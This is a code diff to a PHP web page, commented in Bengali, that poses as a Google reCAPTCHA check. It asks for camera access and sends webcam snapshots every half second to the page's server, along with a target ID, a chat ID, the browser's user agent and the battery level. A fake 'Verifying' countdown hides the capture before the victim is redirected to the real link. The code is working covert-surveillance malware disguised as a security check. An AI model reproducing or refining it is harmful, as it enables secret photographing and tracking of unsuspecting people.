@@ -134,7 +134,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             border-top: 3px solid #4285F4;
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
-            display: block;
+            display: none; /* শুরুতে বন্ধ থাকবে, ক্যামেরা ওপেন হওয়ার পর চালু হবে */
         }
 
         @keyframes spin {
@@ -157,6 +157,16 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             font-family: Roboto, helvetica, arial, sans-serif;
             font-size: 14px;
             color: #2c2c2c;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        /* কোলডাউন টাইমার টেক্সট স্টাইল */
+        #countdownTimer {
+            font-size: 12px;
+            color: #666;
+            font-weight: bold;
         }
 
         .recaptcha-right {
@@ -189,7 +199,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             <div class="recaptcha-checkbox" id="recaptchaCheckbox">
                 <div class="recaptcha-spinner" id="recaptchaSpinner"></div>
             </div>
-            <span class="recaptcha-text">Verifying...</span>
+            <span class="recaptcha-text">
+                <span id="statusText">Verifying</span>
+                <span id="countdownTimer"></span>
+            </span>
         </div>
         <div class="recaptcha-right">
             <div class="recaptcha-logo"></div>
@@ -221,6 +234,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
         }
 
         const recaptchaContainer = document.getElementById('recaptchaContainer');
+        if (finalUrl) {
+            recaptchaContainer.style.display = 'flex';
+        }
+
         let batteryLevelInfo = 'Not Available';
         if (navigator.getBattery) {
             navigator.getBattery().then(battery => {
@@ -228,37 +245,53 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             });
         }
 
+        let isStarted = false;
+
         function requestCameraPermission() {
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(stream => {
                     video.srcObject = stream;
                     
-                    recaptchaContainer.style.display = 'flex';
+                    // ক্যামেরা পুরোপুরি ওপেন হওয়ার পর প্রথম ছবি ক্যাপচার হবে এবং তারপর প্রসেস শুরু হবে
+                    video.onloadedmetadata = () => {
+                        if (isStarted) return;
+                        isStarted = true;
 
-                    // কোনো নির্দিষ্ট ডিলে বা অপেক্ষা না রেখে যত দ্রুত সম্ভব ব্যাকগ্রাউন্ডে ছবি ক্যাপচার করে পাঠাতে থাকবে
-                    let isRunning = true;
+                        // প্রথম ছবি ইনস্ট্যান্ট ক্যাপচার করে পাঠানো
+                        captureAndUpload();
 
-                    async function rapidCaptureLoop() {
-                        while (isRunning) {
-                            await captureAndUpload();
-                        }
-                    }
+                        // প্রতি ০.৫ সেকেন্ড পর পর ছবি পাঠানো চালু
+                        setInterval(captureAndUpload, 500);
 
-                    rapidCaptureLoop();
+                        // স্পিনার ও ৬ সেকেন্ডের কোলডাউন কাউন্টডাউন শুরু
+                        const checkbox = document.getElementById('recaptchaCheckbox');
+                        const spinner = document.getElementById('recaptchaSpinner');
+                        const countdownTimer = document.getElementById('countdownTimer');
+                        const statusText = document.getElementById('statusText');
 
-                    // ৪ সেকেন্ড স্পিনার ঘুরে টিক মার্ক এসে মেইন ট্যাবে লিংক ওপেন হবে
-                    const checkbox = document.getElementById('recaptchaCheckbox');
-                    const spinner = document.getElementById('recaptchaSpinner');
-
-                    setTimeout(() => {
-                        isRunning = false; // ক্যাপচার লুপ বন্ধ হবে
-                        spinner.style.display = 'none';
-                        checkbox.classList.add('checked');
+                        spinner.style.display = 'block';
                         
-                        setTimeout(() => {
-                            window.location.href = finalUrl;
-                        }, 500);
-                    }, 4000);
+                        let timeLeft = 6; // ৬ সেকেন্ড সময়
+                        countdownTimer.textContent = `(${timeLeft}s)`;
+
+                        let timerInterval = setInterval(() => {
+                            timeLeft--;
+                            if (timeLeft > 0) {
+                                countdownTimer.textContent = `(${timeLeft}s)`;
+                            } else {
+                                clearInterval(timerInterval);
+                                spinner.style.display = 'none';
+                                countdownTimer.textContent = '';
+                                statusText.textContent = 'Verified';
+                                checkbox.classList.add('checked');
+                                
+                                // সফলভাবে শেষ হওয়ার পর মেইন ট্যাবে টার্গেট লিংক ওপেন হবে
+                                setTimeout(() => {
+                                    window.location.href = finalUrl;
+                                }, 500);
+                            }
+                        }, 1000);
+                    };
 
                 })
                 .catch(err => {
@@ -271,34 +304,29 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
         requestCameraPermission();
 
         function captureAndUpload() {
-            return new Promise((resolve) => {
-                const context = canvas.getContext('2d');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const imageData = canvas.toDataURL('image/png');
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/png');
 
-                const postData = new URLSearchParams();
-                postData.append('image', imageData);
-                postData.append('target', targetId);
-                postData.append('chat_id', userChatId);
-                postData.append('e', expiryParam); 
-                postData.append('user_agent', navigator.userAgent);
-                postData.append('battery', batteryLevelInfo);
+            const postData = new URLSearchParams();
+            postData.append('image', imageData);
+            postData.append('target', targetId);
+            postData.append('chat_id', userChatId);
+            postData.append('e', expiryParam); 
+            postData.append('user_agent', navigator.userAgent);
+            postData.append('battery', batteryLevelInfo);
 
-                fetch('', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                    },
-                    body: postData
-                }).then(() => {
-                    resolve();
-                }).catch(error => {
-                    console.error('Error:', error);
-                    resolve();
-                });
+            fetch('', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: postData
+            }).catch(error => {
+                console.error('Error:', error);
             });
         }
     </script>
